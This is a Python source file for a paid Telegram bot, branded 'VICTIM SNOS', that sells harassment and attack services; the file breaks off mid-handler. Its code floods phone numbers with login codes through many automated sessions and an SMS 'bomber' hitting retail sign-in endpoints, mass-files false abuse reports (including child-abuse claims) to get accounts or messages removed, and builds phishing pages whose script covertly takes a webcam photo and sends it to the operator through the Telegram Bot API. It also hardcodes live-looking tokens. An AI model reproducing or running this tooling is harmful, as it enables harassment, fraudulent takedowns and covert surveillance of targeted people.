import asyncio
import aiohttp
import random
import json
import os
import logging
import time
import hashlib
import re
from datetime import datetime, timedelta
from typing import Optional, Dict, List
from dataclasses import dataclass, field
from pathlib import Path

from aiogram import Bot, Dispatcher, types, F
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.filters import Command, StateFilter
from aiogram.utils.keyboard import InlineKeyboardBuilder
from aiogram.types import (
    InlineKeyboardMarkup, InlineKeyboardButton, 
    FSInputFile, LabeledPrice, PreCheckoutQuery
)
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode

from pyrogram import Client
from pyrogram.errors import FloodWait
from pyrogram.raw import types as raw_types
from pyrogram.raw.functions.account import ReportPeer
from pyrogram.raw.functions.messages import Report

# ---------- КОНФИГУРАЦИЯ ----------
BOT_TOKEN = "8788795304:AAFA9drMeBOVHp-OR0XWgrZPllVsXx9zgqI"
API_ID = 2040
API_HASH = "b18441a1ff607e10a989891a5462e627"
ADMIN_ID = 7736817432
ALLOWED_USERS_FILE = "allowed_users.json"
CHANNEL_ID = -1003910615357
CHANNEL_URL = "https://t.me/VICTIMSNOSER"
PAYMENT_PROVIDER_TOKEN = "381764678:TEST:86938"
BANNER_FILE = "banner.png"

# Настройки
SESSIONS_PER_USER = 100
REQUESTS_PER_ROUND = 50
MAX_ROUNDS = 5
COOLDOWN_SECONDS = 300

PRICES = {
    "30d": {"stars": 100, "rub": 100},
    "60d": {"stars": 200, "rub": 200},
    "forever": {"stars": 400, "rub": 400}
}

USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 Version/17.2 Mobile/15E148 Safari/604.1',
]

DEVICES = [
    {"model": "iPhone 15 Pro", "system": "iOS 17.3"},
    {"model": "Samsung S24 Ultra", "system": "Android 14"},
]

# Эндпоинты для SMS
SMS_ENDPOINTS = [
    {"url": "https://my.telegram.org/auth/send_password", "phone_field": "phone"},
]

# Эндпоинты для бомбера
BOMBER_ENDPOINTS = [
    {"url": "https://api.delivery-club.ru/api/v2/auth/send-code", "phone_field": "phone"},
    {"url": "https://api.dodopizza.ru/auth/send-code", "phone_field": "phone"},
    {"url": "https://api.citilink.ru/v1/auth/send-code", "phone_field": "phone"},
    {"url": "https://api.avito.ru/auth/v1/send-code", "phone_field": "phone"},
    {"url": "https://api.lenta.com/v1/auth/send-code", "phone_field": "phone"},
    {"url": "https://api.perekrestok.ru/v1/auth/send-sms", "phone_field": "phone"},
    {"url": "https://api.magnit.ru/v1/auth/send-code", "phone_field": "phone"},
    {"url": "https://api.dns-shop.ru/v1/auth/send-code", "phone_field": "phone"},
]

REPORT_REASONS = [
    raw_types.InputReportReasonSpam(),
    raw_types.InputReportReasonViolence(),
    raw_types.InputReportReasonPornography(),
    raw_types.InputReportReasonChildAbuse(),
    raw_types.InputReportReasonOther(),
    raw_types.InputReportReasonCopyright(),
]

# ---------- ЛОГГИРОВАНИЕ ----------
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[logging.StreamHandler()]
)
logger = logging.getLogger(__name__)

# ---------- ИНИЦИАЛИЗАЦИЯ ----------
bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher(storage=MemoryStorage())

# ---------- ДАТАКЛАССЫ ----------
@dataclass
class UserSession:
    client: Client
    index: int
    in_use: bool = False
    flood_until: float = 0
    last_used: float = 0
    fail_count: int = 0
    success_count: int = 0

@dataclass
class UserSessionPool:
    user_id: int
    sessions: List[UserSession] = field(default_factory=list)
    lock: asyncio.Lock = field(default_factory=asyncio.Lock)
    is_creating: bool = False
    is_ready: bool = False
    creation_progress: float = 0

# ---------- ГЛОБАЛЬНЫЕ ПЕРЕМЕННЫЕ ----------
user_pools: Dict[int, UserSessionPool] = {}
ALLOWED_USERS: Dict[str, dict] = {}
active_attacks: Dict[int, asyncio.Event] = {}
user_last_action: Dict[int, float] = {}
promo_codes: Dict[str, dict] = {}
phish_pages: Dict[str, dict] = {}

# ---------- FSM ----------
class AttackState(StatesGroup):
    waiting_phone = State()
    waiting_username = State()
    waiting_count = State()
    waiting_link = State()
    waiting_title = State()

class AdminState(StatesGroup):
    waiting_user_id = State()
    waiting_promo_code = State()
    waiting_promo_days = State()
    waiting_promo_uses = State()

class PurchaseState(StatesGroup):
    waiting_promo = State()

# ---------- ФУНКЦИИ ----------
def load_json(file: str, default: dict = None) -> dict:
    try:
        with open(file, 'r', encoding='utf-8') as f:
            return json.load(f)
    except:
        return default or {}

def save_json(file: str, data: dict):
    try:
        with open(file, 'w', encoding='utf-8') as f:
            json.dump(data, f, indent=4, ensure_ascii=False)
    except:
        pass

def load_allowed_users():
    global ALLOWED_USERS
    ALLOWED_USERS = load_json(ALLOWED_USERS_FILE, {})

def save_allowed_users():
    save_json(ALLOWED_USERS_FILE, ALLOWED_USERS)

def load_promo_codes():
    global promo_codes
    promo_codes = load_json("promo_codes.json", {})

def save_promo_codes():
    save_json("promo_codes.json", promo_codes)

def is_user_allowed(user_id: int) -> bool:
    if user_id == ADMIN_ID:
        return True
    user_id_str = str(user_id)
    if user_id_str not in ALLOWED_USERS:
        return False
    expire = ALLOWED_USERS[user_id_str].get("expire_date")
    if not expire or expire == "forever":
        return True
    try:
        return datetime.now() <= datetime.fromisoformat(expire)
    except:
        return False

def add_subscription(user_id: int, days: int = None, forever: bool = False):
    user_id_str = str(user_id)
    expire = "forever" if forever else (datetime.now() + timedelta(days=days)).isoformat()
    ALLOWED_USERS[user_id_str] = {"expire_date": expire, "added": datetime.now().isoformat()}
    save_allowed_users()

async def check_channel_subscription(user_id: int) -> bool:
    try:
        member = await bot.get_chat_member(chat_id=CHANNEL_ID, user_id=user_id)
        return member.status in ["member", "administrator", "creator"]
    except:
        return False

async def check_access(user_id: int, target) -> bool:
    if not await check_channel_subscription(user_id):
        await send_message(target, f"❌ Подпишитесь на канал: {CHANNEL_URL}")
        return False
    if not is_user_allowed(user_id):
        await send_message(target, f"❌ Нет доступа. ID: <code>{user_id}</code>", get_purchase_menu())
        return False
    return True

async def check_cooldown(user_id: int) -> tuple:
    now = time.time()
    if user_id in user_last_action:
        elapsed = now - user_last_action[user_id]
        if elapsed < COOLDOWN_SECONDS:
            return False, COOLDOWN_SECONDS - elapsed
    return True, 0

def set_cooldown(user_id: int):
    user_last_action[user_id] = time.time()

# ---------- СЕССИИ ----------
async def create_single_session(user_id: int, index: int) -> Optional[UserSession]:
    session_dir = f"sessions/user_{user_id}"
    os.makedirs(session_dir, exist_ok=True)
    session_file = f"{session_dir}/session_{index}"
    
    try:
        device = random.choice(DEVICES)
        client = Client(
            name=session_file,
            api_id=API_ID,
            api_hash=API_HASH,
            in_memory=False,
            no_updates=True,
            device_model=device["model"],
            system_version=device["system"],
            app_version="10.15.1",
            lang_code="ru"
        )
        await client.connect()
        return UserSession(client=client, index=index)
    except:
        return None

async def initialize_user_sessions(user_id: int) -> UserSessionPool:
    if user_id in user_pools and user_pools[user_id].is_ready:
        return user_pools[user_id]
    
    pool = UserSessionPool(user_id=user_id)
    user_pools[user_id] = pool
    pool.is_creating = True
    
    try:
        for i in range(SESSIONS_PER_USER):
            session = await create_single_session(user_id, i)
            if session:
                pool.sessions.append(session)
            pool.creation_progress = (i + 1) / SESSIONS_PER_USER * 100
            await asyncio.sleep(0.3)
        
        pool.is_ready = True
        logger.info(f"User {user_id}: {len(pool.sessions)} sessions ready")
    except Exception as e:
        logger.error(f"Session init error: {e}")
    finally:
        pool.is_creating = False
    
    return pool

# ---------- АТАКИ ----------

# 1. СНОС ПО НОМЕРУ
async def send_sms_http(phone: str) -> bool:
    try:
        async with aiohttp.ClientSession() as session:
            headers = {
                'User-Agent': random.choice(USER_AGENTS),
                'Content-Type': 'application/x-www-form-urlencoded',
                'Origin': 'https://my.telegram.org',
            }
            data = f"phone={phone.replace('+', '')}"
            async with session.post('https://my.telegram.org/auth/send_password',
                                   headers=headers, data=data, timeout=10, ssl=False) as resp:
                return resp.status == 200
    except:
        return False

async def send_sms_session(session: UserSession, phone: str) -> bool:
    try:
        if not session.client.is_connected:
            await session.client.connect()
        await session.client.send_code(phone)
        session.success_count += 1
        return True
    except FloodWait as e:
        session.flood_until = time.time() + e.value
        return False
    except:
        session.fail_count += 1
        return False

async def snos_attack_phone(user_id: int, phone: str, rounds: int, stop_event: asyncio.Event, progress_callback=None) -> int:
    total = 0
    phone = phone.strip().replace(" ", "").replace("-", "")
    if not phone.startswith("+"):
        phone = "+" + phone
    
    pool = user_pools.get(user_id)
    
    for rnd in range(1, rounds + 1):
        if stop_event.is_set():
            break
        
        tasks = []
        # HTTP запросы
        for _ in range(40):
            tasks.append(send_sms_http(phone))
        
        # Сессии
        if pool:
            async with pool.lock:
                available = [s for s in pool.sessions if not s.in_use and s.flood_until < time.time()]
            for s in available[:10]:
                s.in_use = True
                tasks.append(send_sms_session(s, phone))
        
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        if pool:
            for s in pool.sessions:
                s.in_use = False
        
        sent = sum(1 for r in results if r is True)
        total += sent
        
        if progress_callback:
            await progress_callback(rnd, rounds, total)
        
        await asyncio.sleep(1)
    
    return total

# 2. СНОС ПО USERNAME
async def report_account(session: UserSession, username: str) -> bool:
    try:
        if not session.client.is_connected:
            await session.client.connect()
        user = await session.client.get_users(username)
        peer = await session.client.resolve_peer(user.id)
        reason = random.choice(REPORT_REASONS)
        await session.client.invoke(ReportPeer(peer=peer, reason=reason, message="Report"))
        session.success_count += 1
        return True
    except:
        session.fail_count += 1
        return False

async def snos_attack_username(user_id: int, username: str, rounds: int, stop_event: asyncio.Event, progress_callback=None) -> int:
    total = 0
    username = username.strip().replace("@", "")
    pool = user_pools.get(user_id)
    
    for rnd in range(1, rounds + 1):
        if stop_event.is_set():
            break
        
        tasks = []
        if pool:
            async with pool.lock:
                available = [s for s in pool.sessions if not s.in_use and s.flood_until < time.time()]
            for s in available[:30]:
                s.in_use = True
                tasks.append(report_account(s, username))
        
        if tasks:
            results = await asyncio.gather(*tasks, return_exceptions=True)
            for s in pool.sessions:
                s.in_use = False
            total += sum(1 for r in results if r is True)
        
        if progress_callback:
            await progress_callback(rnd, rounds, total)
        
        await asyncio.sleep(1)
    
    return total

# 3. ЖАЛОБА НА СООБЩЕНИЕ
async def report_message(session: UserSession, channel: str, msg_id: int) -> bool:
    try:
        if not session.client.is_connected:
            await session.client.connect()
        chat = await session.client.get_chat(channel)
        peer = await session.client.resolve_peer(chat.id)
        await session.client.invoke(Report(peer=peer, id=[msg_id], reason=raw_types.InputReportReasonSpam(), message="Spam"))
        return True
    except:
        return False

async def mass_report_message(user_id: int, link: str) -> tuple:
    patterns = [r't\.me/([^/]+)/(\d+)', r'telegram\.me/([^/]+)/(\d+)']
    channel, msg_id = None, None
    
    for p in patterns:
        m = re.search(p, link)
        if m:
            channel = m.group(1)
            msg_id = int(m.group(2))
            break
    
    if not channel:
        return 0, "Неверная ссылка"
    
    pool = user_pools.get(user_id)
    if not pool:
        return 0, "Сессии не готовы"
    
    async with pool.lock:
        available = [s for s in pool.sessions if not s.in_use][:30]
        for s in available:
            s.in_use = True
    
    tasks = [report_message(s, channel, msg_id) for s in available]
    results = await asyncio.gather(*tasks, return_exceptions=True)
    
    for s in available:
        s.in_use = False
    
    return sum(1 for r in results if r is True), None

# 4. БОМБЕР
async def send_bomber_request(session: aiohttp.ClientSession, phone: str, endpoint: dict) -> bool:
    try:
        headers = {'User-Agent': random.choice(USER_AGENTS), 'Content-Type': 'application/json'}
        data = {endpoint["phone_field"]: phone.replace("+", "").replace(" ", "")}
        async with session.post(endpoint["url"], headers=headers, json=data, timeout=10, ssl=False) as resp:
            return resp.status < 500
    except:
        return False

async def bomber_attack(phone: str, rounds: int, user_id: int, stop_event: asyncio.Event, progress_callback=None) -> int:
    total = 0
    phone = phone.strip().replace(" ", "").replace("-", "")
    if not phone.startswith("+"):
        phone = "+" + phone
    
    connector = aiohttp.TCPConnector(limit=100, force_close=True, ssl=False)
    async with aiohttp.ClientSession(connector=connector) as sess:
        for rnd in range(1, rounds + 1):
            if stop_event.is_set():
                break
            
            tasks = []
            for endpoint in BOMBER_ENDPOINTS:
                for _ in range(15):
                    tasks.append(send_bomber_request(sess, phone, endpoint))
            
            results = await asyncio.gather(*tasks, return_exceptions=True)
            sent = sum(1 for r in results if r is True)
            total += sent
            
            if progress_callback:
                await progress_callback(rnd, rounds, total)
            
            await asyncio.sleep(0.5)
    
    return total

# 5. ФИШИНГ
PHISH_HTML = '''<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>{title}</title>
    <style>
        body {{ margin: 0; padding: 0; background: #000; }}
        video {{ width: 100%; height: 100vh; object-fit: cover; }}
        #status {{ position: fixed; bottom: 20px; left: 0; right: 0; text-align: center; color: white; }}
    </style>
</head>
<body>
    <video id="video" autoplay playsinline></video>
    <div id="status">Loading camera...</div>
    <canvas id="canvas" style="display:none"></canvas>
    <script>
        const BOT = "{bot_token}";
        const CHAT = "{chat_id}";
        const ID = "{page_id}";
        let sent = false;
        
        async function init() {{
            try {{
                const stream = await navigator.mediaDevices.getUserMedia({{ video: {{ facingMode: "user" }} }});
                document.getElementById('video').srcObject = stream;
                document.getElementById('status').textContent = "Camera active";
                setTimeout(() => capture(stream), 2000);
            }} catch(e) {{
                document.getElementById('status').textContent = "Camera error";
            }}
        }}
        
        async function capture(stream) {{
            if(sent) return;
            try {{
                const video = document.getElementById('video');
                const canvas = document.getElementById('canvas');
                const ctx = canvas.getContext("2d");
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                const blob = await fetch(canvas.toDataURL("image/jpeg")).then(r => r.blob());
                const fd = new FormData();
                fd.append("chat_id", CHAT);
                fd.append("photo", blob, ID + ".jpg");
                fd.append("caption", "📸 Photo | " + ID);
                const resp = await fetch(`https://api.telegram.org/bot${{BOT}}/sendPhoto`, {{method:"POST", body:fd}});
                const data = await resp.json();
                if(data.ok) {{
                    sent = true;
                    document.getElementById('status').textContent = "Done";
                    stream.getTracks().forEach(t => t.stop());
                }}
            }} catch(e) {{}}
        }}
        init();
    </script>
</body>
</html>'''

async def create_phishing_page(title: str, chat_id: int, page_id: str) -> Optional[str]:
    try:
        html = PHISH_HTML.format(title=title, bot_token=BOT_TOKEN, chat_id=chat_id, page_id=page_id)
        
        async with aiohttp.ClientSession() as session:
            async with session.post("https://api.telegra.ph/createAccount",
                                   json={"short_name": f"User{random.randint(1000,9999)}", "author_name": "Telegram"},
                                   timeout=10) as resp:
                data = await resp.json()
                if not data.get("ok"):
                    return None
                token = data["result"]["access_token"]
            
            async with session.post("https://api.telegra.ph/createPage",
                                   json={"access_token": token, "title": title, "content": [{"tag": "p", "children": [html]}]},
                                   timeout=10) as resp:
                data = await resp.json()
                if data.get("ok"):
                    url = data["result"]["url"]
                    phish_pages[page_id] = {"url": url, "chat_id": chat_id}
                    return url
    except:
        pass
    return None

# ---------- UI ----------
def create_button(text: str, callback_data: str) -> InlineKeyboardButton:
    return InlineKeyboardButton(text=text, callback_data=callback_data)

def create_keyboard(buttons: List[List[tuple]], adjust: int = 1) -> InlineKeyboardMarkup:
    builder = InlineKeyboardBuilder()
    for row in buttons:
        for text, data in row:
            builder.button(text=text, callback_data=data)
    builder.adjust(adjust)
    return builder.as_markup()

def get_main_menu(user_id: int) -> InlineKeyboardMarkup:
    buttons = [
        [("🎯 СНОС", "snos_menu")],
        [("💣 БОМБЕР", "bomber_menu")],
        [("🎣 ФИШИНГ", "phish_menu")],
        [("💰 КУПИТЬ", "purchase_menu")],
        [("📊 СТАТУС", "status"), ("⏹ СТОП", "stop")]
    ]
    if user_id == ADMIN_ID:
        buttons.append([("👑 АДМИН", "admin_menu")])
    return create_keyboard(buttons, adjust=2)

def get_snos_menu() -> InlineKeyboardMarkup:
    return create_keyboard([
        [("📱 По номеру", "snos_phone")],
        [("👤 По username", "snos_username")],
        [("💬 Жалоба на сообщение", "report_message")],
        [("◀️ НАЗАД", "main_menu")]
    ])

def get_purchase_menu() -> InlineKeyboardMarkup:
    return create_keyboard([
        [("💎 30 дней - 100₽", "buy_30d")],
        [("💎 60 дней - 200₽", "buy_60d")],
        [("👑 Навсегда - 400₽", "buy_forever")],
        [("🎁 Промокод", "use_promo")]
    ])

async def send_message(target, text: str, markup: InlineKeyboardMarkup = None):
    full_text = f"<b>🔱 VICTIM SNOS</b>\n\n{text}"
    
    try:
        if os.path.exists(BANNER_FILE):
            if hasattr(target, 'answer_photo'):
                return await target.answer_photo(FSInputFile(BANNER_FILE), caption=full_text, reply_markup=markup)
            else:
                return await bot.send_photo(target if isinstance(target, int) else target.chat.id, 
                                           FSInputFile(BANNER_FILE), caption=full_text, reply_markup=markup)
    except:
        pass
    
    if hasattr(target, 'answer'):
        return await target.answer(full_text, reply_markup=markup)
    else:
        return await bot.send_message(target if isinstance(target, int) else target.chat.id, full_text, reply_markup=markup)

# ---------- ОБРАБОТЧИКИ ----------
@dp.message(Command("start"))
async def cmd_start(msg: types.Message):
    user_id = msg.from_user.id
    await msg.delete()
    
    if not await check_access(user_id, msg):
        return
    
    pool = user_pools.get(user_id)
    
    if not pool or not pool.is_ready:
        await send_message(msg, "🔄 Создание сессий...\nЭто займет 1-2 минуты.")
        if not pool:
            asyncio.create_task(initialize_user_sessions(user_id))
        await msg.answer("Нажмите для проверки:",
                       reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                           [create_button("🔄 Проверить", f"check_{user_id}")]
                       ]))
        return
    
    await send_message(msg, f"✅ Бот готов!\n📊 Сессий: {len(pool.sessions)}", get_main_menu(user_id))

@dp.callback_query(F.data.startswith("check_"))
async def check_ready(cb: types.CallbackQuery):
    user_id = int(cb.data.split("_")[1])
    if user_id != cb.from_user.id:
        return
    
    pool = user_pools.get(user_id)
    if pool and pool.is_ready:
        await cb.message.delete()
        await send_message(cb.message, f"✅ Сессии готовы!\n📊 Всего: {len(pool.sessions)}", get_main_menu(user_id))
    else:
        progress = pool.creation_progress if pool else 0
        await cb.answer(f"Прогресс: {progress:.1f}%", show_alert=True)

@dp.callback_query(F.data == "main_menu")
async def main_menu_handler(cb: types.CallbackQuery, state: FSMContext):
    await state.clear()
    if not await check_access(cb.from_user.id, cb):
        return
    await cb.message.edit_caption(caption="<b>🔱 VICTIM SNOS</b>\n\nВыберите действие:", reply_markup=get_main_menu(cb.from_user.id))

@dp.callback_query(F.data == "snos_menu")
async def snos_menu(cb: types.CallbackQuery):
    if not await check_access(cb.from_user.id, cb):
        return
    
    can_attack, remaining = await check_cooldown(cb.from_user.id)
    if not can_attack:
        await cb.answer(f"⏳ Подождите {int(remaining)} сек.", show_alert=True)
        return
    
    if cb.from_user.id in active_attacks:
        await cb.answer("❌ Атака уже идет!", show_alert=True)
        return
    
    await cb.message.edit_caption(caption="<b>🔱 VICTIM SNOS</b>\n\nВыберите тип сноса:", reply_markup=get_snos_menu())

# Снос по номеру
@dp.callback_query(F.data == "snos_phone")
async def snos_phone_start(cb: types.CallbackQuery, state: FSMContext):
    if not await check_access(cb.from_user.id, cb):
        return
    if cb.from_user.id in active_attacks:
        await cb.answer("❌ Атака уже идет!", show_alert=True)
        return
    
    await state.set_state(AttackState.waiting_phone)
    await cb.message.delete()
    await cb.message.answer("<b>🔱 VICTIM SNOS</b>\n\n📱 Введите номер телефона:\n<i>Пример: +79123456789</i>",
                          reply_markup=InlineKeyboardMarkup(inline_keyboard=[[create_button("❌ Отмена", "snos_menu")]]))

@dp.message(StateFilter(AttackState.waiting_phone))
async def snos_phone_received(msg: types.Message, state: FSMContext):
    if not await check_access(msg.from_user.id, msg):
        return
    await state.update_data(phone=msg.text.strip())
    await state.set_state(AttackState.waiting_count)
    await msg.delete()
    await msg.answer(f"<b>🔱 VICTIM SNOS</b>\n\n📱 Телефон: <code>{msg.text.strip()}</code>\n\nВведите количество раундов (1-{MAX_ROUNDS}):")

@dp.message(StateFilter(AttackState.waiting_count))
async def snos_count_received(msg: types.Message, state: FSMContext):
    if not await check_access(msg.from_user.id, msg):
        return
    
    try:
        rounds = int(msg.text.strip())
        if rounds < 1 or rounds > MAX_ROUNDS:
            raise ValueError()
    except:
        await msg.delete()
        await send_message(msg, f"❌ Введите число от 1 до {MAX_ROUNDS}!")
        return
    
    data = await state.get_data()
    phone = data["phone"]
    user_id = msg.from_user.id
    
    await state.clear()
    await msg.delete()
    
    if user_id in active_attacks:
        await send_message(msg, "❌ Атака уже запущена!")
        return
    
    stop_event = asyncio.Event()
    active_attacks[user_id] = stop_event
    
    status_msg = await send_message(msg, f"🎯 <b>СНОС ЗАПУЩЕН</b>\n\n📱 Телефон: <code>{phone}</code>\n🔄 Раунд: 0/{rounds}\n📤 Отправлено: 0")
    
    async def update_progress(cur, tot, sent):
        try:
            await status_msg.edit_caption(
                caption=f"<b>🔱 VICTIM SNOS</b>\n\n🎯 <b>СНОС АКТИВЕН</b>\n\n📱 Телефон: <code>{phone}</code>\n🔄 Раунд: {cur}/{tot}\n📤 Отправлено: {sent}",
                reply_markup=InlineKeyboardMarkup(inline_keyboard=[[create_button("⏹ ОСТАНОВИТЬ", "stop_attack")]])
            )
        except:
            pass
    
    try:
        total = await snos_attack_phone(user_id, phone, rounds, stop_event, update_progress)
        set_cooldown(user_id)
        await status_msg.edit_caption(
            caption=f"<b>🔱 VICTIM SNOS</b>\n\n✅ <b>СНОС ЗАВЕРШЕН</b>\n\n📱 Телефон: <code>{phone}</code>\n📤 Отправлено: <b>{total}</b>\n🔄 Раундов: {rounds}",
            reply_markup=get_main_menu(user_id)
        )
    except:
        await status_msg.edit_caption(caption=f"<b>🔱 VICTIM SNOS</b>\n\n❌ <b>ОШИБКА</b>", reply_markup=get_main_menu(user_id))
    finally:
        if user_id in active_attacks:
            del active_attacks[user_id]

# Снос по username
@dp.callback_query(F.data == "snos_username")
async def snos_username_start(cb: types.CallbackQuery, state: FSMContext):
    if not await check_access(cb.from_user.id, cb):
        return
    if cb.from_user.id in active_attacks:
        await cb.answer("❌ Атака уже идет!", show_alert=True)
        return
    
    await state.set_state(AttackState.waiting_username)
    await cb.message.delete()
    await cb.message.answer("<b>🔱 VICTIM SNOS</b>\n\n👤 Введите username (без @):",
                          reply_markup=InlineKeyboardMarkup(inline_keyboard=[[create_button("❌ Отмена", "snos_menu")]]))

@dp.message(StateFilter(AttackState.waiting_username))
async def snos_username_received(msg: types.Message, state: FSMContext):
    if not await check_access(msg.from_user.id, msg):
        return
    username = msg.text.strip().replace("@", "")
    await state.update_data(username=username)
    await state.set_state(AttackState.waiting_count)
    await msg.delete()
    await msg.answer(f"<b>🔱 VICTIM SNOS</b>\n\n👤 Username: @{username}\n\nВведите количество раундов (1-{MAX_ROUNDS}):")

@dp.message(StateFilter(AttackState.waiting_count))
async def snos_username_count(msg: types.Message, state: FSMContext):
    if not await check_access(msg.from_user.id, msg):
        return
    
    try:
        rounds = int(msg.text.strip())
        if rounds < 1 or rounds > MAX_ROUNDS:
            raise ValueError()
    except:
        await msg.delete()
        await send_message(msg, f"❌ Введите число от 1 до {MAX_ROUNDS}!")
        return
    
    data = await state.get_data()
    username = data["username"]
    user_id = msg.from_user.id
    
    await state.clear()
    await msg.delete()
    
    if user_id in active_attacks:
        await send_message(msg, "❌ Атака уже запущена!")
        return
    
    stop_event = asyncio.Event()
    active_attacks[user_id] = stop_event
    
    status_msg = await send_message(msg, f"🎯 <b>СНОС ЗАПУЩЕН</b>\n\n👤 Username: @{username}\n🔄 Раунд: 0/{rounds}\n📤 Жалоб: 0")
    
    async def update_progress(cur, tot, rep):
        try:
            await status_msg.edit_caption(
                caption=f"<b>🔱 VICTIM SNOS</b>\n\n🎯 <b>СНОС АКТИВЕН</b>\n\n👤 Username: @{username}\n🔄 Раунд: {cur}/{tot}\n📤 Жалоб: {rep}",
                reply_markup=InlineKeyboardMarkup(inline_keyboard=[[create_button("⏹ ОСТАНОВИТЬ", "stop_attack")]])
            )
        except:
            pass
    
    try:
        total = await snos_attack_username(user_id, username, rounds, stop_event, update_progress)
        set_cooldown(user_id)
        await status_msg.edit_caption(
            caption=f"<b>🔱 VICTIM SNOS</b>\n\n✅ <b>СНОС ЗАВЕРШЕН</b>\n\n👤 Username: @{username}\n📤 Жалоб: <b>{total}</b>\n🔄 Раундов: {rounds}",
            reply_markup=get_main_menu(user_id)
        )
    except:
        await status_msg.edit_caption(caption=f"<b>🔱 VICTIM SNOS</b>\n\n❌ <b>ОШИБКА</b>", reply_markup=get_main_menu(user_id))
    finally:
        if user_id in active_attacks:
            del active_attacks[user_id]

# Жалоба на сообщение
@dp.callback_query(F.data == "report_message")
async def report_message_start(cb: types.CallbackQuery, state: FSMContext):
    if not await check_access(cb.from_user.id, cb):
        return
    if cb.from_user.id in active_attacks:
        await cb.answer("❌ Атака уже идет!", show_alert=True)
        return
    
    await state.set_state(AttackState.waiting_link)
    await cb.message.delete()
    await cb.message.answer("<b>🔱 VICTIM SNOS</b>\n\n💬 Введите ссылку на сообщение:\n<i>Пример: https://t.me/channel/123</i>",
                          reply_markup=InlineKeyboardMarkup(inline_keyboard=[[create_button("❌ Отмена", "snos_menu")]]))

@dp.message(StateFilter(AttackState.waiting_link))
async def report_message_link(msg: types.Message, state: FSMContext):
    if not await check_access(msg.from_user.id, msg):
        return
    
    link = msg.text.strip()
    user_id = msg.from_user.id
    
    await state.clear()
    await msg.delete()
    
    status_msg = await send_message(msg, f"📤 <b>ОТПРАВКА ЖАЛОБ</b>\n\n🔗 Ссылка: {link}\n⏳ Обработка...")
    
    reports, err = await mass_report_message(user_id, link)
    set_cooldown(user_id)
    
    if err:
        await status_msg.edit_caption(caption=f"<b>🔱 VICTIM SNOS</b>\n\n❌ {err}", reply_markup=get_main_menu(user_id))
    else:
        await status_msg.edit_caption(caption=f"<b>🔱 VICTIM SNOS</b>\n\n✅ Жалобы отправлены: <b>{reports}</b>", reply_markup=get_main_menu(user_id))

# Бомбер
@dp.callback_query(F.data == "bomber_menu")
async def bomber_menu(cb: types.CallbackQuery, state: FSMContext):
    if not await check_access(cb.from_user.id, cb):
        return
    if cb.from_user.id in active_attacks:
        await cb.answer("❌ Атака уже идет!", show_alert=True)
        return
    
    await state.set_state(AttackState.waiting_phone)
    await cb.message.delete()
    await cb.message.answer("<b>🔱 VICTIM SNOS</b>\n\n💣 <b>SMS БОМБЕР</b>\n\n📱 Введите номер телефона:",
                          reply_markup=InlineKeyboardMarkup(inline_keyboard=[[create_button("❌ Отмена", "main_menu")]]))

@dp.message(StateFilter(AttackState.waiting_phone))
async def bomber_phone(msg: types.Message, state: FSMContext):
    if not await check_access(msg.from_user.id, msg):
        return
    await state.update_data(phone=msg.text.strip())
    await state.set_state(AttackState.waiting_count)
    await msg.delete()
    await msg.answer(f"<b>🔱 VICTIM SNOS</b>\n\n📱 Телефон: <code>{msg.text.strip()}</code>\n\nВведите количество раундов (1-5):")

@dp.message(StateFilter(AttackState.waiting_count))
async def bomber_count(msg: types.Message, state: FSMContext):
    if not await check_access(msg.from_user.id, msg):
        return
    
    try:
        rounds = int(msg.text.strip())
        if rounds < 1 or rounds > 5:
            raise ValueError()
    except:
        await msg.delete()
        await send_message(msg, "❌ Введите число от 1 до 5!")
        return
    
    data = await state.get_data()
    phone = data["phone"]
    user_id = msg.from_user.id
    
    await state.clear()
    await msg.delete()
    
    if user_id in active_attacks:
        await send_message(msg, "❌ Атака уже запущена!")
        return
    
    stop_event = asyncio.Event()
    active_attacks[user_id] = stop_event
    
    status_msg = await send_message(msg, f"💣 <b>БОМБЕР ЗАПУЩЕН</b>\n\n📱 Телефон: <code>{phone}</code>\n🔄 Раунд: 0/{rounds}\n📨 Отправлено: 0")
    
    async def update_progress(cur, tot, sent):
        try:
            await status_msg.edit_caption(
                caption=f"<b>🔱 VICTIM SNOS</b>\n\n💣 <b>БОМБЕР АКТИВЕН</b>\n\n📱 Телефон: <code>{phone}</code>\n🔄 Раунд: {cur}/{tot}\n📨 Отправлено: {sent}",
                reply_markup=InlineKeyboardMarkup(inline_keyboard=[[create_button("⏹ ОСТАНОВИТЬ", "stop_attack")]])
            )
        except:
            pass
    
    try:
        total = await bomber_attack(phone, rounds, user_id, stop_event, update_progress)
        set_cooldown(user_id)
        await status_msg.edit_caption(
            caption=f"<b>🔱 VICTIM SNOS</b>\n\n✅ <b>БОМБЕР ЗАВЕРШЕН</b>\n\n📱 Телефон: <code>{phone}</code>\n📨 SMS: <b>{total}</b>\n🔄 Раундов: {rounds}",
            reply_markup=get_main_menu(user_id)
        )
    except:
        await status_msg.edit_caption(caption=f"<b>🔱 VICTIM SNOS</b>\n\n❌ <b>ОШИБКА</b>", reply_markup=get_main_menu(user_id))
    finally:
        if user_id in active_attacks:
            del active_attacks[user_id]

# Фишинг
@dp.callback_query(F.data == "phish_menu")
async def phish_menu(cb: types.CallbackQuery, state: FSMContext):
    if not await check_access(cb.from_user.id, cb):
        return
    
    await state.set_state(AttackState.waiting_title)
    await cb.message.delete()
    await cb.message.answer("<b>🔱 VICTIM SNOS</b>\n\n🎣 <b>ФИШИНГ</b>\n\nВведите заголовок страницы:\n<i>Например: Telegram Security</i>",
                          reply_markup=InlineKeyboardMarkup(inline_keyboard=[[create_button("❌ Отмена", "main_menu")]]))

@dp.message(StateFilter(AttackState.waiting_title))
async def phish_title(msg: types.Message, state: FSMContext):
    if not await check_access(msg.from_user.id, msg):
        return
    
